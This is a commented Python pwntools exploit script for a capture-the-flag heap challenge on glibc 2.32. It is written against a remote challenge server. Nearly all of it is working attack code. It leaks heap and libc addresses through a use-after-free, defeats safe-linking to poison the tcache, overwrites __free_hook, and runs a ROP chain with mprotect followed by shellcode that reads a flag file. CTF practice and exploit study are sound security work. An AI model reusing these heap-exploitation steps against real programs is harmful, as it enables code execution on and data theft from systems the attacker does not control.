# Introductory challenge on glibc 2.32 and its latest malloc security measure, safe-linking.
from pwn import *
from sys import argv

index = 0
context.arch = 'amd64'


if 'remote' in argv:
    libc_elf = ELF('./libc.so.6')
    add_rsp_0x38 = 0x0000000000077f66
    libc_leak_offset = (0x7f6162366cf0 - 0x00007f6161fb0000)
    p = remote("poseidonchalls.westeurope.cloudapp.azure.com",9004)
elif 'dbg_src' in argv:
    libc_elf = ELF('../../glibc-2.32/prefix/lib/libc.so.6')
    libc_leak_offset = (0x7f77c0220cf0 - 0x00007f77c0068000)
    p = gdb.debug('./cards_debug', gdbscript='c') # patched with RPATH to my build of glibc for source debugging
elif 'dbg' in argv:
    libc_elf = ELF('./libc.so.6')
    add_rsp_0x38 = 0x0000000000077f66
    libc_leak_offset = (0x7f6162366cf0 - 0x00007f6161fb0000)
    p = gdb.debug('./cards_patched', env={'LD_PRELOAD': './libc.so.6'}, gdbscript='c') # patched just to use correct ld
else: # local
    libc_elf = ELF('./libc.so.6')
    add_rsp_0x38 =0x0000000000077f66
    libc_leak_offset = (0x7f6162366cf0 - 0x00007f6161fb0000)
    p = process('./cards_patched', env={'LD_PRELOAD': './libc.so.6'}) # patched just to use correct ld


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr

def add_card(size, color, name):
    global index
    global p
    assert index != 8
    p.sendafter('Choice:', '1')
    p.sendafter('size of the name', str(size))
    p.sendafter('card color:', color)
    p.sendafter('Enter name:', name)
    
    index += 1
    log.info(f'index is at {index}')
    return index - 1


def rm_card(index):
    global p
    p.sendafter('Choice:', '2')
    p.sendafter('index of the card:', str(index))


def edit_name(index, new_name):
    global p
    p.sendafter('Choice:', '3')
    p.sendafter('index of the card:', str(index))
    p.sendafter('new name:', new_name)


def edit_secret_name(new_name):
    global p
    assert len(new_name) <= 64, f'len too high {len(new_name)}'
    p.sendafter('Choice:', '6')
    p.sendafter('secret name:', new_name)


def view_card(index):
    global p
    p.sendafter('Choice:', '4')
    p.sendafter('index of the card:', str(index))


#####################################
# LEAK THE HEAP'S BASE ADDRESS!
#####################################
# How do we do this?
# add_card does: malloc(0x28) for card struct, malloc(0x28) for string struct, malloc(input) for name string.
# rm_card frees card struct, string struct, then string itself.
# Let's use 0x28 as size for the name.
a = add_card(0x28, 'red', 'a'*0x28)

# After this free, the tcache bin will look like:
# name string -> string struct -> card struct
rm_card(a)

# Therefore, adding another card, our name string will take the 3rd element in the bin, the card struct.
# The card struct's 3rd member is a pointer to its string struct and it is still there in memory.
# We can leak it thanks to the fact that no null terminator is appended to our name string.
flag_str = '/home/valvey/flag\x00'
b = add_card(0x28, 'red', 'b'*0x10)
view_card(b)
p.recvuntil('Card name: ')
p.recv(0x10)
heap_base = u64(p.recv(6) + b'\x00\x00') - 0x2d0
log.info(f'Heap: {hex(heap_base)}')


#####################################
# TAKE CONTROL OF THE TCACHE!
#####################################
# We need the heap address to be able to encrypt and decrypt the FD pointers of free tcache bins.
# Let's take control of tcache_perthread_struct by allocating a chunk on it.
# We cannot use 0x28 size for this or the program's mallocs will break everything.
tcache_fd = protect_ptr(heap_base, heap_base+0x10)
c = add_card(0xf8, 'red', 'a')
d = add_card(0xf8, 'red', 'ddddddd') # need to add 2 to put idx count to 2 or our added pointer wont be used
rm_card(d)
rm_card(c)
edit_name(c, p64(tcache_fd)) # d is lost forever lol rip
c = add_card(0xf8, 'red', 'ccccccccc') # same as c

# allocate to the tcache struct and set the 0x100 bin to 7 (full)
# This will be useful for leaking the libc address
tcache_perthread_struct = add_card(0xf8, 'red', p16(0) + p16(2) + p16(0)*12 + p16(7))


#####################################
# LEAK THE LIBC'S BASE ADDRESS!
#####################################
# this will go in the unsorted bin since the tcache is full. it now has pointers to libc
rm_card(c)

# let's take c back. for this, we need to set the tcache bin to empty,
# or it will try taking from there instead of the unsorted bin.
edit_name(tcache_perthread_struct, p16(0) + p16(2) + p16(0)*12 + p16(0))

# I cannot use the same size (0xf8) or it will trigger the exact match condition at malloc.c:3820
# This would cause malloc to place the chunk in the tcache and pop it right after, deleting the libc leaks...
c = add_card(0xe8, 'red', 'c'*8)
view_card(c)
p.recvuntil('c'*8)
libc_leak = u64(p.recv(6) + b'\x00\x00') - libc_leak_offset
libc_elf.address += libc_leak
add_rsp_0x38 += libc_leak
free_hook = libc_elf.sym['__free_hook']
log.info(f'Libc: {hex(libc_leak)}')
log.info(f'Free Hook: {hex(free_hook)}')


#####################################
# RUNNING ARBITRARY INSTRUCTIONS!
#####################################
# Let's modify the tcache struct again, to get a chunk on free_hook
# Modify free_hook to a gadget that simply adds 0x38 to RSP.
# Then if we add a secret name and call free right after, the 0x38 gadget will make it so that the return address is right on top of the first 8 bytes of our secret name :)
# So, the secret name ROP will call mprotect on the heap to make it executable.
# Then, we jump to a shellcode we placed on it.

# The ROP. mprotect is whitelisted by seccomp
rop = ROP(libc_elf)
rop.call('mprotect',  [heap_base, 0x1000, 7])
rop.call(heap_base+0x390)
log.info(f'ROP: \n{rop.dump()}')

# The shellcode. Because of seccomp, we have to use open, read and write syscalls.
edit_name(b, '/home/challenge/flag\x00')
flag_str_addr = heap_base + 0x2a0
shellcode = shellcraft.linux.syscall('SYS_open', flag_str_addr, 'O_RDONLY', 0)
shellcode += shellcraft.linux.syscall('SYS_read', 'rax', heap_base, 32)
shellcode += shellcraft.linux.syscall('SYS_write', 1, heap_base, 32)
shellcode = asm(shellcode)
edit_name(c, shellcode)

# Let's trigger the execution!
edit_name(tcache_perthread_struct, p16(1) + p16(0)*63 + p64(free_hook))
free_hook = add_card(0x10, 'red', p64(add_rsp_0x38))
edit_secret_name(rop.chain())
rm_card(1)

p.interactive()
